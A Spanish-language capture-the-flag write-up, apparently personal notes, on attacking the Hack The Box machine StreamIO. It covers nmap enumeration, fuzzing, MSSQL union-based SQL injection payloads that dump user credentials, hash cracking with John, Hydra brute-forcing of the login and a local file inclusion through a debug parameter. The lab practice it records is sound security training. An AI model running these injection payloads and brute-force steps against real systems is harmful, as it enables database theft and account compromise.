#ActiveDirectory #medium #tecnicas #windows 
### Ping
```python
ping -c 1 10.10.11.158
PING 10.10.11.158 (10.10.11.158) 56(84) bytes of data.
64 bytes from 10.10.11.158: icmp_seq=1 ttl=127 time=150 ms

--- 10.10.11.158 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 150.260/150.260/150.260/0.000 ms
```

### TTL 127 = Windows

### nmap
```python
sudo nmap -p- --open -sC -sV --min-rate 3000 -n -Pn 10.10.11.158 -oN Scan
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 16:20 EDT
Stats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 16:22 (0:00:14 remaining)
Nmap scan report for 10.10.11.158
Host is up (0.15s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-13 03:20:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2024-05-13T03:21:55+00:00; +6h58m32s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49733/tcp open  msrpc         Microsoft Windows RPC
51562/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-13T03:21:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h58m31s, deviation: 0s, median: 6h58m31s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.46 seconds
```

### Enumeración del puerto 53 (Domain)
verificamos la información que hemos obtenido anteriormente sobre el nombre del dominio 
![[Pasted image 20240512164502.png]]

### dnsrecon
dnsrecon nos muestra mucha mas información la cual podría llegar a ser util
![[Pasted image 20240512164739.png]]
`kerberos._tcp: Estos registros SRV indican la ubicación de los servicios de Kerberos en el dominio. Kerberos es un protocolo de autenticación seguro ampliamente utilizado en sistemas informáticos. Con esta información, podrías intentar autenticarte en el dominio utilizando Kerberos y acceder a recursos protegidos por él.

`gc._tcp: Estos registros SRV indican la ubicación de los controladores de dominio global (Global Catalog) en el dominio. El Global Catalog almacena información sobre todos los objetos en el bosque de Active Directory. Podrías usar esta información para acceder al catálogo global y recuperar información sobre objetos de Active Directory.

`ldap._tcp: Estos registros SRV indican la ubicación de los servidores LDAP (Protocolo Ligero de Acceso a Directorios) en el dominio. LDAP se utiliza para acceder y mantener información de directorios distribuidos. Podrías utilizar esta información para realizar consultas LDAP y recuperar información sobre objetos de Active Directory.

`kpasswd._udp y _kpasswd._tcp: Estos registros SRV indican la ubicación del servicio de cambio de contraseña de Kerberos. Podrías usar esta información para cambiar contraseñas en el dominio si tienes los permisos adecuados.

###### aprovechando estos registros de kerberos vamos a intentar enumerar usuarios
![[Pasted image 20240512164846.png]]
### Enumeración del puerto 80 (http)

![[Pasted image 20240512164212.png]]

### Enumeración del puerto 80 (https)
el dominio que hemos encontrado esta corriendo por `https` la cual nos lleva a la siguiente pagina donde podemos ver el apartado de contacto
![[Pasted image 20240512164118.png]]

### Enumeración de usuarios 
en el apartado de `about` tenemos tres usuarios que podemos intentar validar
![[Pasted image 20240514130745.png]]

### Kerbrute
no tenemos exito en la enumeración de usuarios
![[Pasted image 20240514131051.png]]
### Prueba de "XXS"
![[Pasted image 20240514130608.png]]

`XXS`
de esta manera podemos intentar recibir una petición vía `GET` para saber si podríamos posteriormente realizar un `SSRF` 
![[Pasted image 20240514131520.png]]

`python server`
después de esperar unos minutos no he recibido nada así que por el momento descartamos esta ruta
![[Pasted image 20240514131724.png]]

### Fuzzing con wfuzz
despues de aplicar fuzzing puedo llegar a enumerar varios subdominios
![[Pasted image 20240514132853.png]]

### Enumeración de rutas .php
al enumerar archivos .php tambien encontramos varias rutas bastante interesantes
```python
	https://streamio.htb/register.php
	
	https://streamio.htb/login.php
```
![[Pasted image 20240514133058.png]]

`register`
podemos intentar registrarnos en la pagina
![[Pasted image 20240514133630.png]]

`register`
hemos registrado la cuenta con exito
![[Pasted image 20240514133652.png]]

`login`
ahora intentaremos iniciar sesión con la cuenta que hemos creado
![[Pasted image 20240514133829.png]]

`login`
tenemos un login failed parece que tampoco podemos acceder por este camino
![[Pasted image 20240514133939.png]]

### Enumeración del puerto 80 (https) segundo dominio
vamos a comenzar con la enumeración del segundo dominio 
![[Pasted image 20240514134458.png]]
`prueba`
parece que este panel trabaja igual que los anteriores. me permite agregar un nuevo usuario pero puedo llamarlo desde ninguna parte. 
![[Pasted image 20240514135313.png]]

### Fuzzing con wfuzz
al aplicar fuzzing el nuevo dominio hemos descubierto una nueva ruta `search` 
![[Pasted image 20240514135630.png]]

`watch.streamio.htb/search.php`
hemos conseguido otro panel el cual parece ser el encargado de administrar las búsquedas de las peliculas  
![[Pasted image 20240514135740.png]]

### SQLI
después de hacer un montón de pruebas hemos descubierto que la pagina web esta conectada a una base de datos que es vulnerable para `SQLI` con este payload podemos identificar cuantas columnas tiene la base de datos 
```python
	10'union select 1,2,3,4,5,6-- -
```
![[Pasted image 20240514140105.png]]

`MSQL` 
con este payload hemos identificado la versión de la base de datos
```python
	10' union select 1,@@version,3,4,5,6--
```
![[Pasted image 20240514140242.png]]

### MSSQL Injection
en este caso vamos a usar la biblia de los payload [PayloadAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/) aqui podemos conseguir un monton de payloads diferentes para cada base de datos
![[Pasted image 20240514144629.png]]

`MSSQLI DB_NAME` 
recordemos que podemos interactuar bajo la posición numero 2 y 3 en este caso yo usare la numero 2 para inyectar la query que usaremos para enumerar el nombre de la base de datos. de esta manera logramos enumerar correctamente la base de datos
![[Pasted image 20240514144652.png]]

###### haciendo uso del mismo repo vamos a utilizar una nueva query para enumerar MSSQL List Columns
![[Pasted image 20240514145156.png]]

### MSSQL List Tables
de esta manera usando la query hemos logrado enumerar el nombre de las tablas en la base de datos
```python 
10' union select 1,name,3,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- - 
```
![[Pasted image 20240514145530.png]]

``utilizando el campo numero 3 podemos preguntar por el ID de la tablas para poder localizar el identificador especifico``
```python
10' union select 1,name,id,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- -
```
![[Pasted image 20240519140505.png]]

`el siguiente paso es listar las columnas`
```python
10' union select 1,name,3,4,5,6 FROM syscolumns WHERE id = 901578250-- -
```
![[Pasted image 20240519141705.png]]

`ahora vamos a listar username y password para ello usaremos la siguiente query`
```python
10' union select 1,concat(username,':',password),3,4,5,6 FROM users-- -
```
![[Pasted image 20240519142414.png]]

### john
después de limpiar el archivo que hemos creado con los usuarios podemos usar John para desencriptar las contraseñas en este caso John detecta multiples tipos de hashes asi que vamos a investigar exactamente que tipo necesitamos para ello usaremos hash-identifier
![[Pasted image 20240519143339.png]]

### hash-identifier 
de esta panera podemos identificar el tipo de hash que tenemos para poder pasarlo por John en este caso el tipo de hash es MD5
![[Pasted image 20240519143936.png]]

### John
de esta manera logramos identificar de manera correcta los hashes que hemos conseguido y descifrar las contraseñas
![[Pasted image 20240519144123.png]]

### crackmapexec
tratamos de validar usuarios con crackmapexec pero no tenemos éxito 
![[Pasted image 20240519145732.png]]

### hydra
una ves tenemos las credenciales de los usuarios que hemos obtenido de la base de datos podemos realizar un ataque de fuerza bruta sobre el panel de `login.php` 
![[Pasted image 20240519154407.png]]

### admin panel
una vez logeados podemos ir al directorio `/admin` que hemos conseguido anteriormente haciendo fuzzing
![[Pasted image 20240519154823.png]]
`User management`
![[Pasted image 20240519155010.png]]
`staff management`
![[Pasted image 20240519155041.png]]
`Movue management`
![[Pasted image 20240519155108.png]]
###### al investigar cada uno de todas las ventanas me llama la atención que la URL contiene una interrogante =

### Fuzzing con ffuz
![[Pasted image 20240519164840.png]]

`debug`
el debug me indica que es una opción solo para desarrolladores 
![[Pasted image 20240519163513.png]]

### LFI (Local File Inclusión)
haciendo pruebas en el apartado de debug hemos podido listar el archivo /etc/hosts de la maquina Windows 
![[Pasted image 20240519165103.png]]